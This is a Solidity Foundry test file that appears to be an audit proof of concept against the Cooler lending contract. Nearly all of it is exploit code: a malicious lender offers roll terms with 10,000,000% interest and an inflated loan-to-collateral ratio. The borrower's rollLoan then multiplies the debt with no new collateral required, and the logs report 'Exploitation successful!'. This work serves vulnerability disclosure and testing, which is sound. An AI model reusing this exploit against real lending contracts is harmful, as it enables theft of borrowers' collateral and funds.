// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../../../src/Cooler.sol";
import "../../../src/CoolerFactory.sol";
import "solmate/tokens/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol, uint8 decimals) ERC20(name, symbol, decimals) {}
    
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MockCoolerFactory is CoolerFactory {
    constructor() {}
    
    function newEvent(uint256, Events, uint256) external override {}
}

contract ExploitTest is Test {
    Cooler public cooler;
    MockERC20 public collateralToken;
    MockERC20 public debtToken;
    MockCoolerFactory public factory;
    
    address public borrower;
    address public maliciousLender;
    
    uint256 constant INITIAL_COLLATERAL = 100e18;
    uint256 constant LOAN_AMOUNT = 1000e18;
    uint256 constant FAIR_INTEREST = 5e16; // 5% annualized
    uint256 constant LOAN_TO_COLLATERAL = 10e18; // 10 debt tokens per collateral
    uint256 constant DURATION = 365 days;
    
    function setUp() public {
        // Setup actors
        borrower = makeAddr("borrower");
        maliciousLender = makeAddr("maliciousLender");
        
        // Deploy mock tokens
        collateralToken = new MockERC20("Collateral", "COLL", 18);
        debtToken = new MockERC20("Debt", "DEBT", 18);
        
        // Deploy factory
        factory = new MockCoolerFactory();
        
        // Deploy Cooler using the Clone pattern
        // We need to encode the immutable args: owner, collateral, debt, factory
        bytes memory data = abi.encodePacked(
            borrower,           // owner (20 bytes)
            address(collateralToken),  // collateral (20 bytes)
            address(debtToken),        // debt (20 bytes)
            address(factory)           // factory (20 bytes)
        );
        
        // Deploy the Cooler contract with encoded immutable args
        cooler = Cooler(deployCode("Cooler.sol", data));
        
        // Setup initial balances
        collateralToken.mint(borrower, INITIAL_COLLATERAL);
        debtToken.mint(maliciousLender, LOAN_AMOUNT * 10); // Give lender plenty of debt tokens
        
        // Approve Cooler to spend tokens
        vm.prank(borrower);
        collateralToken.approve(address(cooler), type(uint256).max);
        
        vm.prank(maliciousLender);
        debtToken.approve(address(cooler), type(uint256).max);
    }
    
    function testMaliciousRollTermsExploit() public {
        // Step 1: Borrower creates a loan request with fair terms
        // Expected: Borrower will repay 1000 + 5% interest = 1050 debt tokens
        vm.prank(borrower);
        uint256 reqID = cooler.requestLoan(
            LOAN_AMOUNT,
            FAIR_INTEREST,
            LOAN_TO_COLLATERAL,
            DURATION
        );
        
        // Verify collateral was transferred
        assertEq(collateralToken.balanceOf(address(cooler)), INITIAL_COLLATERAL);
        
        // Step 2: Malicious lender clears the request
        vm.prank(maliciousLender);
        uint256 loanID = cooler.clearRequest(reqID, true, false);
        
        // Verify loan was created with expected terms
        Cooler.Loan memory loan = cooler.getLoan(loanID);
        uint256 expectedInterest = cooler.interestFor(LOAN_AMOUNT, FAIR_INTEREST, DURATION);
        uint256 expectedTotalDebt = LOAN_AMOUNT + expectedInterest;
        assertEq(loan.amount, expectedTotalDebt);
        
        console.log("Initial loan amount (principal + fair interest):", loan.amount);
        console.log("Expected repayment with fair terms:", expectedTotalDebt);
        
        // Step 3: Malicious lender provides unfavorable roll terms
        // Setting extremely high interest rate and high loan-to-collateral ratio
        // This will make the new interest astronomical while requiring no new collateral
        uint256 maliciousInterest = 10000000e18; // 10,000,000% annualized interest
        uint256 maliciousLoanToCollateral = 1000e18; // 1000 debt tokens per collateral (very high)
        
        vm.prank(maliciousLender);
        cooler.provideNewTermsForRoll(
            loanID,
            maliciousInterest,
            maliciousLoanToCollateral,
            DURATION
        );
        
        // Step 4: Borrower unknowingly accepts the roll (or is forced to due to circumstances)
        // The borrower might roll thinking they're getting the same terms
        vm.prank(borrower);
        cooler.rollLoan(loanID);
        
        // Step 5: Verify the exploit - loan amount has increased dramatically
        Cooler.Loan memory exploitedLoan = cooler.getLoan(loanID);
        
        console.log("Loan amount after malicious roll:", exploitedLoan.amount);
        console.log("New collateral required:", cooler.newCollateralFor(loanID));
        
        // The new interest calculation with malicious terms
        uint256 maliciousNewInterest = cooler.interestFor(
            expectedTotalDebt,
            maliciousInterest,
            DURATION
        );
        
        console.log("Malicious interest added:", maliciousNewInterest);
        
        // Verify the loan amount has increased by the malicious interest
        assertEq(exploitedLoan.amount, expectedTotalDebt + maliciousNewInterest);
        
        // Verify that no new collateral was required due to the high loanToCollateral ratio
        // With maliciousLoanToCollateral = 1000e18, the needed collateral is much less than current
        uint256 newCollateralNeeded = cooler.newCollateralFor(loanID);
        assertEq(newCollateralNeeded, 0);
        
        // Step 6: Demonstrate the impact - borrower cannot afford to repay
        // The borrower would need to pay an amount far exceeding the collateral value
        assertTrue(exploitedLoan.amount > expectedTotalDebt * 100);
        
        console.log("Exploitation successful!");
        console.log("Borrower expected to pay:", expectedTotalDebt);
        console.log("Borrower now must pay:", exploitedLoan.amount);
        console.log("Increase factor:", exploitedLoan.amount / expectedTotalDebt);
        
        // The borrower is now forced to either:
        // 1. Pay an astronomical amount to get their collateral back
        // 2. Default and lose their collateral to the malicious lender
        
        // Verify borrower cannot reasonably repay
        // Even if borrower had enough tokens, the repayment would be economically irrational
        uint256 collateralValue = INITIAL_COLLATERAL; // Assuming 1:1 value for simplicity
        assertTrue(exploitedLoan.amount > collateralValue * 10);
    }
}